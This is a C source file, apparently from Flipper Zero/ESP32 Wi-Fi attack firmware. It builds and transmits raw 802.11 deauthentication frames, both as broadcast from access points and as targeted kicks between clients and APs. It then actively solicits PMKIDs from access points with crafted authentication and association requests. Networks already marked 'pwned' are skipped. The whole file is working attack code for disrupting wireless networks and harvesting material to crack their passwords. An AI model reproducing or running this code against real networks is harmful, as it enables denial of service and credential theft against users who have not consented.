#include "fg_attack.h"
#include "fg_net_table.h"
#include <string.h>
#include <esp_wifi.h>

#include "wlan_app/pmkid_frames.h"

#define FG_SOLICIT_COOLDOWN_TICKS 10000u // ~10s between solicits per AP
#define FG_SOLICIT_PER_PASS 3

static const uint8_t FG_DEAUTH_TMPL[26] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};

void fg_attack_run(FgApp* app) {
    if(!app->attack_on) return;
    uint8_t ch = app->channel;
    uint8_t f[26];

    // 1) Broadcast + targeted deauth for NOT-yet-pwned APs on this channel.
    uint16_t nn = app->nets.count;
    for(uint16_t i = 0; i < nn; i++) {
        FgNet* net = &app->nets.nets[i];
        if(net->channel != ch) continue;
        if(fg_net_is_pwned(&app->nets, (int)i)) continue; // focus: skip done nets
        memcpy(f, FG_DEAUTH_TMPL, 26); // broadcast deauth from the AP
        memcpy(&f[10], net->bssid, 6);
        memcpy(&f[16], net->bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);
    }

    // 2) Targeted bidirectional deauth for known clients whose AP isn't pwned.
    uint8_t cn = app->client_count;
    for(uint8_t i = 0; i < cn; i++) {
        if(app->clients[i].ch != ch) continue;
        const uint8_t* ap = app->clients[i].ap;
        const uint8_t* sta = app->clients[i].sta;
        int ni = fg_net_find(&app->nets, ap);
        if(ni >= 0 && fg_net_is_pwned(&app->nets, ni)) continue;
        for(int rep = 0; rep < 2; rep++) {
            memcpy(f, FG_DEAUTH_TMPL, 26); // kick client (from AP)
            memcpy(&f[4], sta, 6);
            memcpy(&f[10], ap, 6);
            memcpy(&f[16], ap, 6);
            esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);
            memcpy(f, FG_DEAUTH_TMPL, 26); // kick AP (from client)
            memcpy(&f[4], ap, 6);
            memcpy(&f[10], sta, 6);
            memcpy(&f[16], ap, 6);
            esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);
        }
    }

    // 3) Active clientless PMKID solicitation: Auth(open)+AssocReq(RSN) to a few
    //    not-yet-pwned, not-recently-solicited APs on this channel.
    if(!app->solicit_on) return;
    uint32_t now = furi_get_tick();
    uint8_t our_mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, our_mac);
    int sent = 0;
    uint8_t frame[160];
    for(uint16_t i = 0; i < nn && sent < FG_SOLICIT_PER_PASS; i++) {
        FgNet* net = &app->nets.nets[i];
        if(net->channel != ch) continue;
        if(fg_net_is_pwned(&app->nets, (int)i)) continue;
        if(net->solicit_tick && (now - net->solicit_tick) < FG_SOLICIT_COOLDOWN_TICKS) continue;

        size_t al = pmkid_build_auth_open(frame, sizeof(frame), net->bssid, our_mac);
        if(al) esp_wifi_80211_tx(WIFI_IF_STA, frame, al, false);
        size_t rl = pmkid_build_assoc_req(
            frame, sizeof(frame), net->bssid, our_mac, net->ssid[0] ? net->ssid : "");
        if(rl) esp_wifi_80211_tx(WIFI_IF_STA, frame, rl, false);

        net->solicit_tick = now;
        net->flags |= FG_NET_SOLICITED;
        sent++;
    }
}
